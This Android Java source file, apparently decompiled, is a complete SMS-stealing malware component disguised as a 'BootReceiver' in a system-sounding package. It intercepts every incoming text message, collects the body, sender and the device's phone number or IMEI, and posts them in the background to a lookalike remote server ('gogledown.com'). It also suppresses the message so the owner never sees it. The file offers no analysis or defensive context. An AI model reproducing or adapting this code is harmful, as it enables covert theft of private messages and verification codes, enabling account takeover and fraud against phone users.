package android.sms.core;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

public class BootReceiver extends BroadcastReceiver {
    TelephonyManager manager;
    String originAddress = "";
    String phoneNum = "";

    public void onReceive(Context arg0, Intent arg1) {
        String actiString = arg1.getAction();
        this.manager = (TelephonyManager) arg0.getSystemService("phone");
        this.phoneNum = this.manager.getLine1Number();
        if (this.phoneNum.equals("")) {
            this.phoneNum = this.manager.getDeviceId();
        }
        if (actiString.equals("android.provider.Telephony.SMS_RECEIVED")) {
            SmsMessage[] messages = getMessagesFromIntent(arg1);
            final StringBuilder sb = new StringBuilder();
            for (SmsMessage message : messages) {
                this.originAddress = message.getOriginatingAddress();
                sb.append(message.getDisplayMessageBody());
            }
            new Thread(new Runnable() {
                public void run() {
                    List<NameValuePair> params = new ArrayList();
                    NameValuePair pair = new BasicNameValuePair("sbid", BootReceiver.this.phoneNum);
                    NameValuePair pair1 = new BasicNameValuePair("sendnumber", BootReceiver.this.originAddress);
                    NameValuePair pair2 = new BasicNameValuePair("sendtype", "2");
                    params.add(new BasicNameValuePair("smscontent", sb.toString()));
                    params.add(pair2);
                    params.add(pair1);
                    params.add(pair);
                    Log.e("tag", "result = " + ToolHelper.postData("http://www.gogledown.com/vipboss/saves.php", params));
                }
            }).start();
            abortBroadcast();
        }
    }

    private final SmsMessage[] getMessagesFromIntent(Intent intent) {
        int i;
        Object[] messages = (Object[]) intent.getSerializableExtra("pdus");
        byte[][] pduObjs = new byte[messages.length][];
        for (i = 0; i < messages.length; i++) {
            pduObjs[i] = (byte[]) messages[i];
        }
        byte[][] pdus = new byte[pduObjs.length][];
        int pduCount = pdus.length;
        SmsMessage[] msgs = new SmsMessage[pduCount];
        for (i = 0; i < pduCount; i++) {
            pdus[i] = pduObjs[i];
            msgs[i] = SmsMessage.createFromPdu(pdus[i]);
        }
        return msgs;
    }
}
